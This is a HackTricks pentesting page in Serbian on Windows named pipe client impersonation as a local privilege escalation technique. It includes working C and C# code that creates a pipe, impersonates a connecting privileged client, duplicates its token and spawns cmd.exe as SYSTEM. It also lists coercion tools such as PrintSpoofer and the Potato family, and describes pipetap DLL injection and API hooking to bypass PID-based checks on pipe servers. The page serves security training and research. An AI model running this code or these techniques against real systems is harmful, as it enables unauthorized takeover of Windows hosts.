# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation je local privilege escalation primitive koji omogućava named-pipe server thread-u da preuzme security context klijenta koji se poveže na njega. U praksi, napadač koji može da izvrši kod sa SeImpersonatePrivilege može primorati privilegovani klijent (npr. SYSTEM service) da se poveže na pipe koji kontroliše napadač, pozvati ImpersonateNamedPipeClient, duplicirati dobijeni token u primary token i pokrenuti proces kao klijent (često NT AUTHORITY\SYSTEM).

Ova stranica se fokusira na osnovnu tehniku. Za end-to-end exploit chains koje primoravaju SYSTEM da se poveže na vaš pipe, pogledajte Potato family stranice navedene dole.

## TL;DR
- Kreirajte named pipe: \\.\pipe\<random> i sačekajte konekciju.
- Naterajte privilegovanu komponentu da se poveže na njega (spooler/DCOM/EFSRPC/etc.).
- Pročitajte bar jednu poruku sa pipe-a, zatim pozovite ImpersonateNamedPipeClient.
- Otvorite impersonation token iz tekućeg threada, DuplicateTokenEx(TokenPrimary) i CreateProcessWithTokenW/CreateProcessAsUser da pokrenete SYSTEM proces.

## Requirements and key APIs
- Privilegije koje su obično potrebne procesu/treadu koji poziva:
  - SeImpersonatePrivilege da biste uspešno impersonirali povezani klijent i da biste koristili CreateProcessWithTokenW.
  - Alternativno, nakon što impersonirate SYSTEM, možete koristiti CreateProcessAsUser, što može zahtevati SeAssignPrimaryTokenPrivilege i SeIncreaseQuotaPrivilege (ovo je zadovoljeno dok impersonirate SYSTEM).
- Osnovni API-ji koji se koriste:
  - CreateNamedPipe / ConnectNamedPipe
  - ReadFile/WriteFile (mora se pročitati bar jedna poruka pre impersonacije)
  - ImpersonateNamedPipeClient i RevertToSelf
  - OpenThreadToken, DuplicateTokenEx(TokenPrimary)
  - CreateProcessWithTokenW ili CreateProcessAsUser
- Impersonation level: da biste izveli korisne akcije lokalno, klijent mora dozvoliti SecurityImpersonation (podrazumevano za mnoge lokalne RPC/named-pipe klijente). Klijenti mogu smanjiti nivo koristeći SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION prilikom otvaranja pipe-a.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Napomene:
- Ako ImpersonateNamedPipeClient vrati ERROR_CANNOT_IMPERSONATE (1368), uverite se da ste prvo pročitali iz pipe-a i da klijent nije ograničio impersonation na Identification nivo.
- Preferirajte DuplicateTokenEx sa SecurityImpersonation i TokenPrimary za kreiranje primary token-a pogodnog za pokretanje procesa.

## .NET kratak primer
U .NET-u, NamedPipeServerStream može da impersonira preko RunAsClient. Kada impersonirate, duplicirajte token niti i pokrenite proces.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Uobičajeni okidači/koercije da dovedete SYSTEM do vašeg pipe-a
Ove tehnike koerciraju privilegovane servise da se povežu na vaš named pipe kako biste ih mogli impersonirati:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Pogledajte detaljnu upotrebu i kompatibilnost ovde:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Ako vam treba kompletan primer izrade pipe-a i impersonacije da spawn-ujete SYSTEM iz service trigger-a, pogledajte:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)
Named-pipe hardened servisi i dalje mogu biti oteti instrumentisanjem poverljivog klijenta. Alati kao [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) ubacuju pomoćni DLL u klijenta, proxy-ju njegov saobraćaj i omogućavaju vam da manipulišete privilegovanim IPC pre nego što ga SYSTEM servis potroši.

### Inline API hooking unutar poverljivih procesa
- Ubacite pomoćni DLL (OpenProcess → CreateRemoteThread → LoadLibrary) u bilo koji klijent.
- DLL (Detours) presreće `ReadFile`, `WriteFile`, itd., ali samo kada `GetFileType` prijavi `FILE_TYPE_PIPE`; kopira svaki bafer/metapodatke u kontrolni pipe, omogućava vam da ih izmenite/obrišete/ponovo reproducirate, a zatim nastavlja originalni API.
- Pretvara legitimnog klijenta u Burp-style proxy: pauzira UTF-8/UTF-16/raw payloads, izaziva error paths, ponovo reprodukuje sekvence ili izveze JSON zapise.

### Remote client mode da zaobiđe provere zasnovane na PID-u
- Injektujte u allow-listed klijenta, zatim u GUI izaberite pipe i taj PID.
- DLL poziva `CreateFile`/`ConnectNamedPipe` unutar poverljivog procesa i preusmerava I/O nazad vama, tako da server i dalje vidi legitimni PID/image.
- Zaobilazi filtere koji se oslanjaju na `GetNamedPipeClientProcessId` ili provere potpisanih image-a.

### Brza enumeracija i fuzzing
- `pipelist` enumeriše `\\.\pipe\*`, prikazuje ACLs/SIDs i prosleđuje unose drugim modulima za neposredno ispitivanje.
- Pipe client/message composer povezuje se na bilo koje ime i gradi UTF-8/UTF-16/raw-hex payload-e; importujte uhvaćene blob-ove, mutirajte polja i pošaljite ponovo da biste lovili deserializere ili neautentifikovane command verb-e.
- Pomoćni DLL može da pokrene loopback TCP listener tako da alati/fuzzeri mogu da upravljaju pipe-om udaljeno preko Python SDK-a.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
Kombinujte TCP bridge sa VM snapshot restores da biste izazvali padove u krhkim IPC parserima.

### Operativna razmatranja
- Named pipes su niske latencije; duga zadržavanja prilikom uređivanja bafera mogu dovesti do deadlock-a krhkih servisa.
- Pokrivenost Overlapped/completion-port I/O je delimična, zato očekujte edge case-ove.
- Injection je bučan i unsigned, zato ga tretirajte kao lab/exploit-dev pomoć, a ne kao stealth implant.

## Otklanjanje problema i zamke
- Morate pročitati bar jednu poruku iz pipe-a pre nego što pozovete ImpersonateNamedPipeClient; inače ćete dobiti ERROR_CANNOT_IMPERSONATE (1368).
- Ako se klijent poveže sa SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, server ne može u potpunosti da impersonira; proverite impersonation level tokena preko GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW zahteva SeImpersonatePrivilege na pozivaocu. Ako to zakaže sa ERROR_PRIVILEGE_NOT_HELD (1314), koristite CreateProcessAsUser nakon što ste već impersonirali SYSTEM.
- Osigurajte da security descriptor vašeg pipe-a dozvoljava ciljanom servisu da se poveže ako ga ojačate; po defaultu, pipe-ovi pod \\.\pipe su dostupni prema DACL servera.

## Reference
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
